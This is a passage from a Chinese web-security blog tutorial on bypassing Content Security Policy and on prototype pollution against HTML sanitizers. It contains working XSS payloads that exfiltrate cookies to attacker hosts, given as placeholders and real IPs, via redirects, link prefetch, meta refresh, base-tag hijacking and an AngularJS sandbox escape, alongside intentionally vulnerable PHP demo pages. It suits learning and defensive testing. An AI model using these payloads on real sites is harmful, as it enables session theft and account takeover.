脚本，服务端生成一次性加密字符并且只能使用一次；</li>\n</ul>\n</blockquote>\n<p>下面通过具体的例子来看看 CSP 指令和指令值的用法：</p>\n<blockquote>\n<p><code>&lt;img src=image.jpg&gt;</code>  该图片来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz1zVml1bndJZVJJN3Z1TSUyRkhOR0NNcUElM0QlM0QuWEJKcDJWbUhSTEpkblE4SCUyQk1LbmZxS3JqampabEh6b0h1eXltTXB2VktRJTNE\"> https://example.com</span> 将被允许载入，因为是同源资源；</p>\n<p><code>&lt;script src=script.js&gt;</code>  该 js 脚本来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz13bXlvQ05zZnZhTVdUckxuZWREZkJRJTNEJTNELjBKWmNPNSUyRnowS1dOcWVlb0V1QWVVSXJsVVRmRFlwd3RUTGp0QlFUaXFEMCUzRA==\"> https://example.com</span> 将被允许载入，因为是同源资源；</p>\n<p><code>&lt;script src=https://examples.com/script.js&gt;</code> ，该 js 脚本将不允许被加载执行，因为来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz11NnE3QXR2M0t6RTFGbWtRaXJCeE1nJTNEJTNELjdQQm81JTJGWUs3bU5wSVZZNkUlMkZ0Z082ME5PZE1YUWlOUUtpeTBFbzZOUk9ZJTNE\"> https://examples.com</span>， 非同源；</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE2LzA5L2NzcC5odG1s\">Content Security Policy 入门教程 - 阮一峰的网络日志 (ruanyifeng.com)</span></p>\n<p>CSP 绕过</p>\n<p>1.location.href 绕过</p>\n<p>服务端代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src &#x27;unsafe-inline&#x27;&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;//</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>本地代码，模拟接收 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tif (isset($_GET[&#x27;xss&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content&quot;.@$_GET[&#x27;xss&#x27;];</span><br><span class=\"line\">    &#125;//</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>这个地方可以用 location 跳转：location.href (window.location/window.open) 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?a=&lt;script&gt;location.href=&quot;http://127.0.0.1&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>在我们已经可以执行任意 js 脚本但由于 CSP 的阻拦我们的 cookie 无法带外传输，就可以用此方法，注意编码 %2B</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</span><br><span class=\"line\">http://101.35.139.208:9999/csp.php?a=&lt;script&gt;location.href=&quot;http://127.0.0.1:18888/csp.php?xss=&quot;%2bdocument.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>利用前提：存在 XSS，可以执行任意 js 脚本，但由于 CSP 无法数据外带。</p>\n<p>​\t\t\t\t\tCSP 规则 <code>header(&quot;Content-Security-Policy: default-src 'self';script-src:'unsafe-inline';&quot;);</code></p>\n<p>2.link 绕过 (失效)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- firefox --&gt;</span><br><span class=\"line\">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- chrome --&gt;</span><br><span class=\"line\">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>外带：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var link = document.createElement(&quot;link&quot;);</span><br><span class=\"line\">link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class=\"line\">link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);</span><br><span class=\"line\">document.head.appendChild(link);</span><br></pre></td></tr></table></figure>\n<p>3.meta 跳转绕过</p>\n<p>与 link 标签原理相似，利用 meta 标签实现网页跳转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/csp.php?xss=&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://150.158.188.194:7890/&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p>meta 可以控制缓存（在 header 没有设置的情况下），有时候可以用来绕过 CSP nonce。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>外带 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var ometa = document.createElement(&quot;meta&quot;);</span><br><span class=\"line\">ometa.setAttribute(&quot;http-equiv&quot;, &quot;refresh&quot;);</span><br><span class=\"line\">ometa.setAttribute(&quot;content&quot;, &quot;1;url=127.0.0.1:18888/csp.php?xss=&quot;%2bdocument.cookie);</span><br><span class=\"line\">document.head.appendChild(ometa);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>4.iframe 标签绕过</p>\n<p><strong>同源</strong> ，当一个同源站点存在两个页面，我们称它们为 A 页面和 B 页面，假如 A 页面有 CSP 保护，而 B 页面没有，我们就可以直接在 B 页面新建 <code>iframe</code>  用 js 操作 A 页面的 DOM，也就是说 A 页面的 CSP 防护完全失效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- A页面 --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- B页面 --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- 下面模拟XSS --&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var iframe = document.createElement(&#x27;iframe&#x27;);</span><br><span class=\"line\">iframe.src=&quot;http://127.0.0.1/a.php&quot;;</span><br><span class=\"line\">document.body.appendChild(iframe);</span><br><span class=\"line\">setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&#x27;flag&#x27;).innerHTML),1000);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>前提条件：主站需要有 xss，需要拿到分站权限</p>\n<p>5.CDN 绕过</p>\n<p>通过白名单中的 cdn 存在漏洞绕过 CSP</p>\n<p>hackmd CSP</p>\n<p>该 md CSP 政策还允许了 <code>https://cdnjs.cloudflare.com/</code>  这个 js hosting 服务，这个提供了很多第三方的函数库以供引入，这样我们就可以直接借助 AngularJS 函数库以及 Client-Side Template Injection 里面成熟的沙盒逃逸技术绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- foo=&quot;--&gt;</span><br><span class=\"line\">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;div ng-app&gt;</span><br><span class=\"line\">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>\n<p>6. 站点静态资源可控绕过</p>\n<ul>\n<li>存在可控静态资源</li>\n<li>站点在 CSP 允许名单中</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;&gt;</span><br><span class=\"line\">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure>\n<p>7. 不完整 script 绕过</p>\n<p>只适用于火狐，且只能<?php echo $_GET['xss']?> <script nonce='xxx××'>相邻可以用，通过不完整的 script 标签将后面的 nonce 变为自己的属性</p>\n<p><code>http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)</code></p>\n<p><code>&lt;script</code>  就会被变成一个属性，值为空，之后的 <code>nonce='xxxxx'</code></p>\n<p>会被当成我们输入的 script 标签中的一个属性</p>\n<ul>\n<li>可控点在合法 script 标签上方，且其中没有其他标签</li>\n<li>XSS 页面的 CSP script-src 只采用了 nonce 方式</li>\n</ul>\n<p>需要将后面的没用内容注释，或者加到另一个属性中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)//</span><br><span class=\"line\">x http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1) 123=</span><br></pre></td></tr></table></figure>\n<p>8. 不完整资源标签获取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;;script-src &#x27;self&#x27;; img-src *;&quot;&gt;</span><br><span class=\"line\">&lt;?php echo $_GET[&#x27;xss&#x27;]?&gt;</span><br><span class=\"line\">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class=\"line\">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure>\n<p>可以使用外联图片的 CSP，将 src 中内容延伸至下一个 &quot;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/csp.php?xss=&lt;img src=&quot;//vps_ip?a= </span><br></pre></td></tr></table></figure>\n<p>baseuri 绕过</p>\n<p>当网站设置了 script nonce， 在无法猜测 nonce 值的情况下，且 base-uri 没有被设置。</p>\n<p>那么可以使用 <code>&lt;base&gt;</code>  标签将文档的基础 URI 修改为自己的服务器地址。</p>\n<p>如下，需要本来文档就存在相对地址加载 js 的情况。最后 只要在自己服务器放上一个 123.js 就行了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">header(&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;base href=&quot;//xx.xx.xxx.xx:8888&quot;&gt;</span><br><span class=\"line\">&lt;script nonce=&#x27;test&#x27; src=&quot;/123.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>302 跳转</p>\n<p>网站都会带有一个 302 跳转功能的页面，用它来导向到本站的资源或者是外部的链接</p>\n<p>如果我们的 script-src 设置为某个目录，通过这个目录下的 302 跳转，是可以绕过 csp 读取到另一个目录下的脚本的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a/csp.php</span><br><span class=\"line\">&lt;!-- csp.php --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"> header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src http://127.0.0.1/a/&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"> &lt;html&gt;</span><br><span class=\"line\"> &lt;head&gt;</span><br><span class=\"line\"> &lt;/head&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">     csp header test </span><br><span class=\"line\"> &lt;/body&gt;</span><br><span class=\"line\"> &lt;/html&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">a/redirect.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">header(&quot;Location: &quot; . $_GET[url]);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">b/text.php</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\"> &lt;title&gt;1&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">123</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>csp 限制了 <code>/a/</code>  目录，而我们的目标脚本在 <code>/b/</code>  目录下则如果这时候请求 <code>redirect</code>  页面去访问 <code>/b/</code>  下的脚本是可以通过 csp 的检查的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/a/redirect.php?url=/b/test.php</span><br></pre></td></tr></table></figure>\n<p>但这是有一个很严格的条件的，加载的资源所在的域必须和自身处于同域下 (<a href=\"http://example.com\">example.com</a>)，也就是不可能通过 302 跳转去加载一个其他域下的脚本的，比如通过</p>\n<p><code>a.com</code>  的 302 跳转去加载 <code>b.com</code>  下的脚本是不可以</p>\n<p>在实际环境中，比如某个站调用某个 cdn，或者类似于 <code>script-src example.com/scripts/ google.com/recaptcha/</code> ， <code>google.com/script/*</code>  下有个 <code>evil.js</code> ，然后刚好站内有个重定向，漏洞条件就已经成立了。</p>\n<ul>\n<li>在 script-src 允许的域下，需要存在一个重定向的页面，这种页面大多存在于登陆，退出登录</li>\n<li>在 script-src 允许的域下，存在某个任意文件的上传点（任意目录）</li>\n<li>有特别的方式可以跨域发送请求，或者有站内域可以接受请求</li>\n</ul>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE1ODkyOC5odG1s\">CSP 浅析与绕过 - SecPulse.COM | 安全脉搏</span></p>\n</blockquote>\n<p>CRLF 文件头</p>\n<p>当一个页面存在 CRLF 漏洞时，且我们的可控点在 CSP 上方，就可以通过注入回车换行，将 CSP 挤到 HTTP 返回体中，这样就绕过了 CSP</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzk0ODM2OC5odG1s\">我的 CSP 绕过思路及总结 | CN-SEC 中文网</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMTU3ODItOWQ2MWU1Y2EtYjViMy00ODE4LTg1OGQtMjJkODA4NWY0YzVmLm1k\">📎通过浏览器缓存来 bypass CSP script nonce.md</span></p>\n<p>条件</p>\n<p>1. 开启缓存，nonce 保存在本地  <code>header( 'cache-Control: max-age=99999999 ' );</code></p>\n<p>不能对页面发起请求，因为发起请求之后，后台就会刷新页面并刷新 nonce 的字符串</p>\n<p>2. 有 document.write ，截断 href，只会保存 #前面的内容</p>\n<p>3.textarea nonce，textarea 中只能容纳文本</p>\n<p>4.ajax 无刷新</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script nonce=&#x27;&lt;?php echo $random;?&gt;&#x27;&gt;document.write(&#x27;URL &#x27; + unescape(location.href))&lt;/script&gt;&lt;script nonce=&#x27;&lt;?php echo $random;?&gt;&#x27;&gt;console.log(&#x27;another nonced script&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>然后我们需要利用 iframe 引入这个页面，并对其发起请求获取页面内容，这里我们通过向其中注入一个 <code>&lt;textarea&gt;</code>  标签来吃掉后面的 script 标签，这样就可以获取内容。</p>\n<p>然后我们需要一个页面去获取 nonce 字符串，为了反复获得，这里需要开启 session。</p>\n<p>唯一的问题就是在 nonce script 上，由于 csp 开启的问题，我们没办法自动实现自动提交，也就是攻击者必须要使按钮被点击，才能实现一次攻击。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171141247.png\" alt=\"image-20221013171141247\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171233853.png\" alt=\"image-20221013171233853\"></p>\n<h2 id=\"原型链污染\"><a class=\"markdownIt-Anchor\" href=\"#原型链污染\">#</a> 原型链污染</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNjM1MTI4NTYtNjJiY2JkYjAtZDI0ZS00NTc4LTlhZWMtOGM0ODlkN2U3OTQ1Lm1k\">📎原型污染 - 并绕过客户端 HTML sanitizer.md</span></p>\n<p>原型链特定于 JavaScript，它源于 JavaScript 继承模型，称为<strong>基于原型的继承</strong>，JavaScript 中的每个对象都有一个原型（也可以是 <code>null</code> ）。如果我们不指定它，默认情况下对象的原型是 <code>Object.prototype</code> ，通过 object.prototype 检查对象的属性。</p>\n<p>当我们尝试访问对象的属性时，JS 引擎首先检查对象本身是否包含该属性。如果是，则将其退回。否则，JS 会检查原型是否具有该属性。如果没有，JS 会检查原型的原型…… 以此类推，直到原型为 <code>null</code> . 它被称为原型链。</p>\n<p>如果我们能以某种方式<strong>污染 Object.prototype</strong>（即用新属性对其进行扩展），那么所有 JS 对象都会具有这些属性。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const user = &#123; userid: 123 &#125;;if (user.admin) &#123;  console.log(&#x27;You are an admin&#x27;);&#125;</span><br></pre></td></tr></table></figure>\n<p>当前 user 没有 admin 的属性，但如果我们污染了 <code>Object.prototype</code>  和定义名为的属性 <code>admin</code> ，那么 <code>console.log</code>  将执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.prototype.admin = true;const user = &#123; userid: 123 &#125;;if (user.admin) &#123;  console.log(&#x27;You are an admin&#x27;); // this will execute&#125;</span><br></pre></td></tr></table></figure>\n<p>此漏洞的入口点通常是合并操作（即将一个对象的所有属性复制到另一个对象）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const obj1 = &#123; a: 1, b: 2 &#125;;</span><br><span class=\"line\">recursiveMerge(obj1, obj2); </span><br><span class=\"line\">递归合并的基本流程是：</span><br><span class=\"line\">1. 遍历 obj2 的所有属性并检查它们是否存在于`obj1`.</span><br><span class=\"line\">2. 如果存在属性，则对该属性执行合并操作。</span><br><span class=\"line\">3. 如果属性不存在，则将其从 复制`obj2`到`obj1`。</span><br></pre></td></tr></table></figure>\n<p>如果用户对要合并的对象有任何控制权，那么通常其中一个对象来自 <code>JSON.parse</code> . And <code>JSON.parse</code>  有点特别，因为它被视为 <code>__proto__</code> “普通” 属性，即没有作为原型访问器的特殊含义</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1024x219.png\" alt=\"img\"></p>\n<p>访问 <code>obj1.__proto__</code> 返回 <code>Object.prototype</code> （ <code>__proto__</code> 返回原型的特殊属性也是如此），同时 <code>obj2.__proto__</code> 包含 JSON 中给出的值，即： <code>123</code> . 这证明了 <code>__proto__</code> 属性的处理方式与 <code>JSON.parse</code>  普通 JavaScript 不同。</p>\n<p>所以现在想象一个 <code>recursiveMerge</code>  合并两个对象的函数：</p>\n<ul>\n<li><code>obj1=&#123;&#125;</code></li>\n<li><code>obj2=JSON.parse('&#123;&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;')</code></li>\n</ul>\n<ol>\n<li>遍历 <code>obj2</code> . 唯一的属性是 <code>__proto__</code> 。</li>\n<li>检查是否 <code>obj1.__proto__</code> 存在。确实如此。</li>\n<li>遍历 <code>obj2.__proto__</code> . 唯一的属性是 <code>x</code> 。</li>\n<li>赋值： <code>obj1.__proto__.x = obj2.__proto__.x</code> 。因为 <code>obj1.__proto__</code> 指向 <code>Object.prototype</code> ，则原型被污染。</li>\n</ol>\n<p>在许多流行的 JS 库中都发现了这种类型的错误，包括<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbnlrLmlvL3Z1bG4vU05ZSy1KUy1MT0RBU0gtNDUwMjAy\"> lodash</span> 或<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbnlrLmlvL2Jsb2cvYWZ0ZXItdGhyZWUteWVhcnMtb2Ytc2lsZW5jZS1hLW5ldy1qcXVlcnktcHJvdG90eXBlLXBvbGx1dGlvbi12dWxuZXJhYmlsaXR5LWVtZXJnZXMtb25jZS1hZ2Fpbi8=\"> jQuery</span>。</p>\n<p>所有公开的利用原型污染的例子都集中在 NodeJS 上，其目标是实现远程代码执行。</p>\n<h3 id=\"通过原型链污染bypass-html-sanitizer\"><a class=\"markdownIt-Anchor\" href=\"#通过原型链污染bypass-html-sanitizer\">#</a> 通过原型链污染 bypass HTML sanitizer</h3>\n<p>想象一下，我们有一个只允许 <code>&lt;b&gt;</code>  和 <code>&lt;h1&gt;</code>  标签的 sanitizer。如果我们用以下标记：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h1&gt;Header&lt;/h1&gt;This is &lt;b&gt;some&lt;/b&gt; &lt;i&gt;HTML&lt;/i&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>它应该将其清理为以下形式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h1&gt;Header&lt;/h1&gt;This is &lt;b&gt;some&lt;/b&gt; HTML</span><br></pre></td></tr></table></figure>\n<p>HTML sanitizer 需要维护允许的元素属性和元素列表。基本上，库通常采用以下两种方式之一来存储列表：</p>\n<p>该库可能有一个包含允许元素列表的数组，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const ALLOWED_ELEMENTS = [&quot;h1&quot;, &quot;i&quot;, &quot;b&quot;, &quot;div&quot;]</span><br></pre></td></tr></table></figure>\n<p>然后检查是否允许某些元素，他们只需调用 <code>ALLOWED_ELEMENTS.includes(element)</code> . 这种方法可以避免原型污染，因为我们不能扩展数组；也就是说，我们不能污染 <code>length</code>  属性，也不能污染已经存在的索引。即使使用 <code> 